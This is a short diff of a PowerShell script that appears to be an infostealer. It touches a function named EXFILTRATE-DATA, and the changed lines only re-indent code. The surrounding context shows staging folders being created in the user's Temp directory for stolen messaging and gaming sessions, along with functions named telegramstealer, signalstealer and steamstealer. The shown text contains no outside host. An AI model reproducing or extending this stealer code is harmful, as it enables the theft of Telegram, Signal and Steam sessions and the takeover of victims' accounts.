@@ -85,9 +85,9 @@ function EXFILTRATE-DATA {
     misc 
     
 	# All Messaging Sessions
-     New-Item -Path "$env:localappdata\Temp" -Name "Messaging Sessions" -ItemType Directory -force | out-null
-	 $messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"
-	 
+    New-Item -Path "$env:localappdata\Temp" -Name "Messaging Sessions" -ItemType Directory -force | out-null
+	$messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"
+
 	# Telegram Session Stealer
     function telegramstealer {
         $processname = "telegram"
@@ -130,10 +130,10 @@ function EXFILTRATE-DATA {
     }
     signalstealer 
 
-	 # All Gaming Sessions
-	 New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
-     $gaming_sessions = "$env:localappdata\Temp\Gaming Sessions"
-	 
+	# All Gaming Sessions
+	New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
+    $gaming_sessions = "$env:localappdata\Temp\Gaming Sessions"
+
     # Steam Session Stealer
     function steamstealer {
         $processname = "steam"
